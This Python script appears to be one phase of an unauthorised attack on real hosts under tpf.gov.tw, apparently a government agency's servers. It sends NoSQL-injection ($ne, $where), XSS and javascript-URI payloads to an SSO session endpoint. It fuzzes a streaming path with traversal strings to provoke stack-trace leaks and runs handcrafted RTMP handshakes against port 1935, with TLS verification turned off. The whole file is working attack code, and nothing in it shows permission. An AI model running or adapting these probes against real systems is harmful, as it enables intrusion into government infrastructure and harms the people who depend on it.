#!/usr/bin/env python3
"""Phase 3-Deep: mer2:443 SSO注入 + mer2voip:30080 /live 500错误栈泄露 + RTMP 完整协议"""
import http.client, ssl, json, urllib.parse, sys, socket, struct, time
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(host, port, method, path, body=None, headers=None, timeout=10, proto='https'):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
    if headers: h.update(headers)
    cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout) if proto=='https' else http.client.HTTPConnection(host, port, timeout=timeout)
    cn.request(method, path, body=body, headers=h)
    r = cn.getresponse()
    rb = r.read()
    rh = dict(r.getheaders())
    cn.close()
    return r.status, rb, rh

print("="*80)
print("Phase 3-D1: mer2:443 /Views/CreateSession.aspx SSO 注入测试")
print("="*80)
# 已知 :4004/ssoLogin 仅 sessionId 字段名硬编码，值类型接受 string/array/object/number/boolean
# 测试 mer2 是否同样接受
sso_payloads = [
    ('form-basic', b'sessionId=test'),
    ('form-arr', b'sessionId[]=test'),
    ('form-multi', b'sessionId=a&sessionId=b'),
    ('form-empty', b'sessionId='),
    ('json-basic', b'{"sessionId":"test"}'),
    ('json-arr', b'{"sessionId":["a","b"]}'),
    ('json-obj', b'{"sessionId":{"$ne":1}}'),
    ('json-where', b'{"sessionId":{"$where":"1"}}'),
    ('json-bool', b'{"sessionId":true}'),
    ('json-int', b'{"sessionId":123456}'),
    ('json-null', b'{"sessionId":null}'),
    ('url-xss', b'sessionId=<script>alert(1)</script>'),
    ('url-redirect', b'sessionId=javascript:alert(1)'),
]
for name, body in sso_payloads:
    headers = {'Content-Type': 'application/x-www-form-urlencoded'} if name.startswith('form') else {'Content-Type': 'application/json'}
    try:
        s, b, rh = req('mer2.tpf.gov.tw', 443, 'POST', '/Views/CreateSession.aspx', body=body, headers=headers, timeout=10)
        # 检查 Set-Cookie 或 Location 重定向
        cookies = {k:v for k,v in rh.items() if 'cookie' in k.lower() or 'set-' in k.lower()}
        loc = rh.get('Location', '')
        print(f"  {name:18s} → status={s}  loc={loc[:60]!r}  cookies={cookies}")
        print(f"      body[:200]={b[:200]!r}")
    except Exception as e:
        print(f"  {name:18s} → ERROR {type(e).__name__}")

print()
print("="*80)
print("Phase 3-D2: mer2voip:30080 /live 路径深度探测（500 错误栈泄露）")
print("="*80)
for path in ['/live', '/live/test', '/live/stream', '/live/live', '/live/../', '/live/test/stream', '/live/?stream=test', '/live/.m3u8', '/live/?app=rtmp&stream=test', '/live?stream=test', '/hls', '/hls/test', '/hls/test.m3u8', '/live;stream=test', '/live:test', '/live/test?app=rtmp', '/live?app=rtmp&name=test', '/live?type=rtmp']:
    try:
        s, b, _ = req('mer2voip.tpf.gov.tw', 30080, 'GET', path, timeout=10)
        # 输出完整 body 前 200B
        print(f"  GET {path:45s} → status={s}  body[:200]={b[:200]!r}")
    except Exception as e:
        print(f"  GET {path:45s} → ERROR {type(e).__name__}")

print()
print("="*80)
print("Phase 3-D3: mer2voip:1935 RTMP 协议深入")
print("="*80)
# RTMP 握手：发送 C0+C1，接收 S0+S1+S2，再发 C2
s = socket.create_connection(('mer2voip.tpf.gov.tw', 1935), timeout=5)
s.send(b'\x03' + b'\x00'*1536 + b'\x00'*1536)  # C0+C1+C2 完整 3073B
time.sleep(1)
data = b''
try:
    while len(data) < 3073:
        chunk = s.recv(3073 - len(data))
        if not chunk: break
        data += chunk
except:
    pass
print(f"  RTMP 完整握手 recv {len(data)} bytes")
print(f"  hex[0:64]: {data[:64].hex()}")
print(f"  hex[1536:1600]: {data[1536:1600].hex()}")
print(f"  hex[3072:3136]: {data[3072:3136].hex() if len(data)>3072 else '(short)'}")
s.close()

# 测试完整握手后能否继续 RTMP 协议（send connect 命令）
print()
print("  RTMP connect 命令测试:")
s = socket.create_connection(('mer2voip.tpf.gov.tw', 1935), timeout=5)
# 完整 C0+C1+C2
s.send(b'\x03' + b'\x01'*1536 + b'\x02'*1536)
time.sleep(0.5)
data = s.recv(3073)
print(f"  收到 S0+S1+S2: {len(data)} bytes")
# RTMP "connect" 命令 - amf0 编码
amf0_connect = (
    b'\x02' +  # AMF0 Command Message, Message Stream ID = 0
    b'\x00\x00\x00\x00' +  # Stream ID 0
    b'\x00\x00\x00\x1f' +  # Length
    b'\x14'  # Message Type ID = 20 (AMF0 command)
)
# 简化：直接发 RTMP "connect" 字符串 + transactionID=1 + Object{app:rtmp}
import struct
# RTMP chunk: format=0, chunk_stream_id=3 (control), message_type_id=20, message_stream_id=0, timestamp=0, body_length
body = (
    b'\x02' + b'\x00\x07connect\x02\x00\x01?\x00\x04' + b'app\x02\x00\x05rtmp/\x00\x00\x00\x00'
)
# Length
chunk = (
    b'\x00' +  # format=0, csid=0
    struct.pack('>I', len(body))[1:] +  # 24-bit length
    b'\x14' +  # type 20 (AMF0 cmd)
    b'\x00\x00\x00\x00' +  # stream id 0
    body
)
s.send(chunk)
time.sleep(1)
try:
    data = s.recv(4096)
    print(f"  RTMP connect resp: {len(data)} bytes: {data[:64].hex()}")
    print(f"  ASCII: {data[:200]!r}")
except Exception as e:
    print(f"  RTMP connect ERROR: {e!r}")
s.close()

